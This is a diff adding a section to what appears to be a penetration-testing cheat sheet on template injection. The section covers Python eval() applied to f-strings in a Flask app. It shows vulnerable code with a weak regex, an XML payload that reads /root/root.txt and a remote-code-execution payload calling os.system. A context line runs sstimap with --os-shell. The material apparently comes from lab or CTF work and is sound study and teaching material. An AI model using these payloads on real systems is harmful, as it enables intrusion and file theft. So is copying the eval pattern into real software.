@@ -128,6 +128,47 @@ python3 sstimap.py -u "http://TARGET/page?name=test" --os-shell
 
 ---
 
+## Python eval() in f-string / format string
+
+When user input is interpolated into a string that is then passed to **`eval()`** (e.g. `eval(f"f'''{template}'''")`), any field that allows **`{...}`**-style expressions can execute Python.
+
+**Vulnerable code (Flask, XML-derived fields):**
+
+```python
+def template(first, last, sender, ts, dob, gender):
+    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
+    for s in [first, last, sender, ts, dob, gender]:
+        if not pattern.fullmatch(s):
+            return "[INVALID_INPUT]"
+    # ...
+    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
+    try:
+        return eval(f"f'''{template}'''")
+```
+
+**Regex bypassed:** `^[a-zA-Z0-9._'\"(){}=+/]+$` — allows `{`, `}`, `(`, `)`, `'`, `"`, `.`, etc., so a value like `{open("/root/root.txt").read()}` passes validation and is then evaluated inside the f-string.
+
+**Exploit XML (file read):**
+
+```xml
+<patient>
+    <firstname>John</firstname>
+    <lastname>Doe</lastname>
+    <sender_app>{open("/root/root.txt").read()}</sender_app>
+    <timestamp>2222</timestamp>
+    <birth_date>01/01/1985</birth_date>
+    <gender>Male</gender>
+</patient>
+```
+
+**RCE variant:**
+
+```xml
+<sender_app>{__import__('os').system('id')}</sender_app>
+```
+
+---
+
 ## Other Engines Quick Reference
 
 ### ERB (Ruby)
